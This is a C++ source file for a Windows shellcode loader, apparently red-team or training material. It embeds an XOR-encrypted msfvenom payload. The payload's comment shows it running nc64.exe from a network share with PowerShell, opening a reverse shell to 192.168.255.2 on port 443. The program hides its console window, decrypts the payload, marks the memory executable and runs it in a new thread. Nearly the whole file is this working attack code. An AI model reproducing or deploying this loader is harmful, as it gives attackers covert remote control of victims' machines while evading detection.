#include <windows.h>
#include <iostream>

// msfvenom -p windows/x64/exec CMD='\\192.168.255.2\share\nc64.exe 192.168.255.2 443 -e powershell.exe' --encrypt xor --encrypt-key fun -f csharp
unsigned char my_payload[] = { 0x9a,0x3d,0xed,0x82,0x85,0x86,
    0xa6,0x75,0x6e,0x66,0x34,0x3f,0x27,0x25,0x3c,0x37,0x23,0x26,
    0x57,0xa7,0x0b,0x2e,0xfe,0x3c,0x06,0x3d,0xe5,0x34,0x6d,0x26,
    0xed,0x27,0x4e,0x2e,0xfe,0x1c,0x36,0x3d,0x61,0xd1,0x3f,0x24,
    0x2b,0x44,0xa7,0x2e,0x44,0xae,0xca,0x49,0x0f,0x1a,0x77,0x42,
    0x46,0x34,0xaf,0xaf,0x78,0x2f,0x67,0xb4,0x8c,0x8b,0x27,0x2f,
    0x37,0x3d,0xe5,0x34,0x55,0xe5,0x24,0x49,0x26,0x67,0xa5,0xe5,
    0xe6,0xfd,0x6e,0x66,0x75,0x26,0xe3,0xb5,0x1a,0x01,0x3d,0x6f,
    0xb6,0x25,0xe5,0x2e,0x6d,0x2a,0xed,0x35,0x4e,0x2f,0x74,0xbe,
    0x85,0x23,0x26,0x99,0xbc,0x2f,0xed,0x41,0xe6,0x2e,0x74,0xb8,
    0x2b,0x44,0xa7,0x2e,0x44,0xae,0xca,0x34,0xaf,0xaf,0x78,0x2f,
    0x67,0xb4,0x56,0x86,0x00,0x9f,0x2a,0x76,0x22,0x42,0x7d,0x2b,
    0x5f,0xa4,0x1b,0xbe,0x2d,0x2a,0xed,0x35,0x4a,0x2f,0x74,0xbe,
    0x00,0x34,0xe5,0x6a,0x3d,0x2a,0xed,0x35,0x72,0x2f,0x74,0xbe,
    0x27,0xfe,0x6a,0xee,0x3d,0x6f,0xb6,0x34,0x36,0x27,0x2d,0x30,
    0x3f,0x2f,0x2f,0x3e,0x34,0x37,0x27,0x2f,0x26,0xe5,0x99,0x4e,
    0x27,0x27,0x91,0x86,0x2d,0x2f,0x3f,0x2f,0x26,0xed,0x67,0x87,
    0x31,0x8a,0x91,0x99,0x28,0x26,0xdc,0x74,0x6e,0x66,0x75,0x6e,
    0x66,0x75,0x6e,0x2e,0xf8,0xe3,0x67,0x74,0x6e,0x66,0x34,0xd4,
    0x57,0xfe,0x01,0xe1,0x8a,0xbb,0xdd,0x85,0xdb,0xc4,0x23,0x2f,
    0xdc,0xd3,0xfb,0xdb,0xe8,0x91,0xb3,0x3d,0xed,0xa2,0x5d,0x52,
    0x60,0x09,0x64,0xe6,0x8e,0x8e,0x13,0x70,0xd5,0x21,0x66,0x1c,
    0x09,0x1f,0x6e,0x3f,0x34,0xe7,0xbc,0x8a,0xbb,0x3a,0x29,0x5f,
    0x5f,0x47,0x40,0x57,0x43,0x56,0x48,0x47,0x5b,0x53,0x5b,0x5c,
    0x3a,0x06,0x06,0x07,0x07,0x0b,0x3a,0x1b,0x0d,0x50,0x41,0x40,
    0x03,0x0d,0x0b,0x46,0x44,0x57,0x54,0x5b,0x5f,0x50,0x4d,0x40,
    0x54,0x40,0x5b,0x48,0x47,0x4e,0x52,0x41,0x5d,0x46,0x58,0x0b,
    0x46,0x05,0x01,0x11,0x10,0x1c,0x15,0x1d,0x0b,0x0a,0x19,0x40,
    0x03,0x0d,0x0b,0x66 };
unsigned int my_payload_len = sizeof(my_payload);

// key for XOR decrypt
char my_secret_key[] = "fun";

// decrypt deXOR function
void XOR(char* data, size_t data_len, char* key, size_t key_len) {
    int j;
    j = 0;
    for (int i = 0; i < data_len; i++) {
        if (j == key_len - 1) j = 0;

        data[i] = data[i] ^ key[j];
        j++;
    }
}

int main() {
    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, 0);
    // 2 lines above to hide the console
    void* my_payload_mem;
    BOOL rv;
    HANDLE th;
    DWORD oldprotect = 0;
    // Allocate a memory buffer for payload
    my_payload_mem = VirtualAlloc(0, my_payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    // Decrypt (DeXOR) the payload
    XOR((char*)my_payload, my_payload_len, my_secret_key, sizeof(my_secret_key));
    // copy payload to buffer
    RtlMoveMemory(my_payload_mem, my_payload, my_payload_len);
    // make new buffer as executable
    rv = VirtualProtect(my_payload_mem, my_payload_len, PAGE_EXECUTE_READ, &oldprotect);
    if (rv != 0) {
        // run payload
        th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)my_payload_mem, 0, 0, 0);
        WaitForSingleObject(th, -1);
    }

    return 0;
}